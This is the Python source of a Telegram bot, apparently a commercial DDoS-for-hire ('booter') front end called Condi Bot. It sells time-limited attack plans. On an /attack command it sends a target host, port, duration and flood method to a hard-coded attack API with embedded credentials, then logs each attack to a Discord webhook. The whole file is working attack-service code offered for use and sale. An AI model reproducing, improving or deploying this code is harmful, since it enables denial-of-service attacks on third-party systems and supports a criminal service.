# source write by zxcr9999
import telepot
import time
import datetime
import requests
import threading
import subprocess
import json
from telepot.loop import MessageLoop

webhook_url = '' # discord webhook here
TOKEN = '' # your bot token here

attack_slots = 2
attack_slots_lock = threading.Lock()
last_attack_time = None
successful_attacks = []

def read_authorized_users():
    try:
        with open('users.txt', 'r') as f:
            lines = f.readlines()
            authorized_users = {}
            for line in lines:
                if line.strip():
                    user_id, expiry_date_str, max_duration_str = line.strip().split(':')
                    expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
                    max_duration = int(max_duration_str)
                    authorized_users[int(user_id)] = {'expiry_date': expiry_date, 'max_duration': max_duration}
                return authorized_users
    except FileNotFoundError:
        return {}

def write_authorized_users(authorized_users):
    with open('users.txt', 'w') as f:
        for user_id, info in authorized_users.items():
            expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
            max_duration_str = str(info['max_duration'])
            f.write(f"{user_id}:{expiry_date_str}:{max_duration_str}\n")

def is_user_authorized(user_id):
    global authorized_users
    if user_id not in authorized_users:
        return False
    info = authorized_users[user_id]
    if info['expiry_date'] < datetime.datetime.now():
        del authorized_users[user_id]
        write_authorized_users(authorized_users)
        bot.sendMessage(user_id, 'Your plan has expired. Contact @zxcr9999 to renew.')
        return False
    return True

def add_admin_user(user_id):
    global admin_users
    admin_users.add(user_id)

def remove_admin_user(user_id):
    global admin_users
    if user_id in admin_users:
        admin_users.remove(user_id)

def get_username(user_id):
    user = bot.getChat(user_id)
    if 'username' in user:
        return user['username']
    else:
        return None

def handle_message(msg):
    global authorized_users
    global admin_users
    global attack_slots
    global last_attack_time
    global successful_attacks

    content_type, chat_type, chat_id = telepot.glance(msg)
    user_id = msg['from']['id']

    if not last_attack_time:
        last_attack_time = None

    if not is_user_authorized(user_id):
        bot.sendMessage(chat_id, 'You dont have plan. Contact @zxcr9999 for buying plan.')
        return

    if user_id not in admin_users:
        if content_type == 'text' and (msg['text'].startswith('/adduser') or msg['text'].startswith('/removeuser') or msg['text'].startswith('/updateuser') or msg['text'].startswith('/userlist')):
            bot.sendMessage(chat_id, 'Only admin can using commands.')
            return

    if content_type == 'text':
        text = msg['text']
        if text == '/help':
            bot.sendMessage(chat_id, 'User commands:\n\n/methods - Show attack methods.\n/attack - Sent attack.\n/running - Show running attacks..\n/info - Show bot information.\n\nAdmin commands:\n/adduser - Add new user.\n/removeuser - Remove user.\n/updateuser - Update user information.\n/userlist - Show all users information.')
        elif text == '/methods':
            bot.sendMessage(chat_id, 'List methods:\n- tls-destroy: I dont know lol\n- handshake: TCP handshake flood')
        elif text == '/info':
            bot.sendMessage(chat_id, 'Condi Bot:\n\nOwner: @zxcr9999\nVersion: 1.0\nMax slots attack: 2\nIf you want to buy source. Contact @zxcr9999.')
        elif text == '/running':
            handle_running_command(chat_id)
        elif text.startswith('/attack'):
            if not is_user_authorized(user_id):
                bot.sendMessage(chat_id, 'You dont have plan. Contact @zxcr9999 for buying plan.')
                return

            if attack_slots < 1:
                bot.sendMessage(chat_id, 'No available attack slot. Please wait...')
                return

            last_attack_time = datetime.datetime.now()

            args = text.split()[1:]
            if len(args) != 4:
                bot.sendMessage(chat_id, 'Using /attack [target] [port] [duration] [method]')
                return
            target, port, duration, method = args
            info = authorized_users[user_id]

            max_duration = info['max_duration']
            if int(duration) > max_duration:
                bot.sendMessage(chat_id, 'Your maximum attack duration is {} seconds. Please buy more using less attack time.'.format(max_duration))
                return

            url = f'http://14.225.205.203/api/attack?username=zxcr&secret=zxcr1&host={target}&port={port}&time={duration}&method={method}'
            response = requests.get(url)
            bot.sendMessage(chat_id, 'Attack sent!!\n\nTarget: {}\nPort: {}\nDuration: {}\nMethod: {}'.format(target, port, duration, method))
            decrease_attack_slots()
            threading.Timer(float(duration), increase_attack_slots).start()
            last_attack_time = datetime.datetime.now()
            write_authorized_users(authorized_users)

            successful_attacks.append({
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'user_id': user_id,
                'time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
            
            username = get_username(user_id)
            if username:
                username = get_username(user_id) or f'Unknown user {user_id}'
                message = f"Condi Attack Logs:\n\nUsername: {username}\nTarget: {target}\nPort: {port}\nDuration: {duration}\nMethod: {method}\nDate: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nAttack slots: {attack_slots}/2"

            payload = {
                'username': 'Condi Bot',
                'content': message              
            }
            
            headers = {
                'Content-Type': 'application/json'
            }
            
            response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
            
            if response.status_code != 204:
                print('Failed to send message to Discord webhook')

        elif text.startswith('/adduser'):
            args = text.split()[1:]
            if len(args) != 3:
                bot.sendMessage(chat_id, 'Using: /adduser [id] [expiry date] [max attack times]')
            target_user_id = int(args[0])
            expiry_date_str = args[1]
            max_duration = int(args[2])
            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
            authorized_users[target_user_id] = {'expiry_date': expiry_date, 'max_duration': max_duration}
            write_authorized_users(authorized_users)
            bot.sendMessage(chat_id, 'Added {} to access list with expiry date {} and maximum duration {} seconds.'.format(target_user_id, expiry_date_str, max_duration))
        elif text.startswith('/removeuser'):
            bot.sendMessage(chat_id, 'Using: /removeuser [id]')
            user_id = int(text.split()[1])
            if user_id in authorized_users:
                del authorized_users[user_id]
                write_authorized_users(authorized_users)
                bot.sendMessage(chat_id, 'Removed {} from the access list.'.format(user_id))
            else:
                bot.sendMessage(chat_id, 'User {} not in the access list.'.format(user_id))
        elif text.startswith('/updateuser'):
            args = text.split()[1:]
            if len(args) != 3:
                bot.sendMessage(chat_id, 'Using: /updateuser [id] [expiry date] [max attack times]')
            target_user_id = int(args[0])
            expiry_date_str = args[1]
            max_duration = int(args[2])
            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
            if target_user_id in authorized_users:
                authorized_users[target_user_id]['expiry_date'] = expiry_date
                authorized_users[target_user_id]['max_duration'] = max_duration
                write_authorized_users(authorized_users)
                bot.sendMessage(chat_id, 'Updated user {} with expiry date {} and maximum duration {} seconds.'.format(target_user_id, expiry_date_str, max_duration))
            else:
                bot.sendMessage(chat_id, 'User {} is not in the access list.'.format(target_user_id))
        elif text == '/userlist':
            handle_userlist_command(chat_id)

        else:
            bot.sendMessage(chat_id, 'Using /help for show all commands')

def handle_userlist_command(chat_id):
    global authorized_users
    userlist = ''
    for user_id, info in authorized_users.items():
        expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
        max_duration_str = str(info['max_duration'])
        userlist += f'User ID: {user_id}\nExpiry Date: {expiry_date_str}\nMax Duration: {max_duration_str}\n\n'
    bot.sendMessage(chat_id, userlist)

def handle_running_command(chat_id):
    global successful_attacks

    if len(successful_attacks) == 0:
        bot.sendMessage(chat_id, 'No successful attacks yet.')
    else:
        message = ''
        for attack in successful_attacks:
            message += f'Target: {attack["target"]}\nPort: {attack["port"]}\nDuration: {attack["duration"]}\nMethod: {attack["method"]}\nUser ID: {attack["user_id"]}\nDate: {attack["time"]}\n\n'
        bot.sendMessage(chat_id, message)
        successful_attacks = []

def check_expired_users():
    global authorized_users
    now = datetime.datetime.now()
    for user_id, user_info in list(authorized_users.items()):
        expiry_date = user_info['expiry_date']
        if expiry_date < now:
            del authorized_users[user_id]
            write_authorized_users(authorized_users)
            bot.sendMessage(user_id, 'Your plan has expired. Contact @zxcr9999 to renew.')
    threading.Timer(86400, check_expired_users).start()

def increase_attack_slots():
    global attack_slots
    with attack_slots_lock:
        attack_slots += 1

def decrease_attack_slots():
    global attack_slots
    with attack_slots_lock:
        attack_slots -= 1

if __name__ == '__main__':
    bot = telepot.Bot(TOKEN)
    authorized_users = read_authorized_users()
    admin_users = set()
    add_admin_user() # admin user id here
    MessageLoop(bot, handle_message).run_as_thread()

    print('Bot running...')
    check_expired_users()
    while True:
        try:
            time.sleep(10)
        except KeyboardInterrupt:
            print('\nBot stopped.')
            break
